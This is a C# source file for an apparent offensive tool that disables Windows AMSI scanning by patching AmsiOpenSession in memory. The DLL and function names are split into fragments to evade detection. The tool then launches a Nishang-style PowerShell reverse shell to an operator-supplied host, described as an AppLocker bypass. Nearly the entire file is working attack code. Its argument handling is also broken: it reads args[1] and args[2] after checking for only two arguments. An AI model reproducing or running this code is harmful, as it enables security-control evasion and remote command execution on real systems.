using System;
using System.Collections.ObjectModel;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Text;
using System.Runtime.InteropServices;
using System.Linq;

namespace sharperpick
{
    internal class Program
    {
        // Dependencies for the AMSI bypass
        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)] string lpFileName);

        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        // Patch AMSI
        static bool AmsiBypass()
        {
            try
            {
                byte[] patch = new byte[] { 0x48, 0x31, 0xC0 };

                IntPtr lib = LoadLibrary("a" + "ms" + "i.d" + "ll");
                IntPtr addr = GetProcAddress(lib, "Am" + "si" + "Op" + "e" + "nSe" + "ssi" + "on");
                uint oldFlags;
                VirtualProtect(addr, (UIntPtr)0x64, 0x40, out oldFlags);
                Marshal.Copy(patch, 0, addr, patch.Length);

                return true;
            }
            catch (Exception e)
            {
                Console.WriteLine("{0}", e.Message);
                return false;
            }
        }

        // Invoke a Nishang reverse shell onliner
        private static void InvokePowerShellTcp(string host, string port)
        {
            string command = "$client = New-Object System.Net.Sockets.TCPClient('" + host + "'," + port + ");" +
                "$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};" +
                "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)" +
                "{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);" +
                "$sendback = (iex $data 2>&1 | Out-String );" +
                "$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';" +
                "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);" +
                "$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()";
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();
            RunspaceInvoke rsi = new RunspaceInvoke(rs);
            Pipeline pipeline = rs.CreatePipeline();
            pipeline.Commands.AddScript(command);
            Collection<PSObject> result = pipeline.Invoke();
            rs.Close();
        }

        static void Usage()
        {
            Console.Write(
                "AMSI and AppLocker bypass for Nishang Invoke-PowerShellTcp\n" +
                "Usage: ./invoke_powershelltcp.exe <ip> <port>\n"
            );
        }

        static void Main(string[] args)
        {
            if (args.Length < 2)
            {
                Usage();
                return;
            }
            
            string host = args[1];
            string port = args[2];
            
            // Bypass AMSI and execute reverse shell
            if (AmsiBypass())
            {
                InvokePowerShellTcp(host, port);
            }
            return;
        }
    }
}

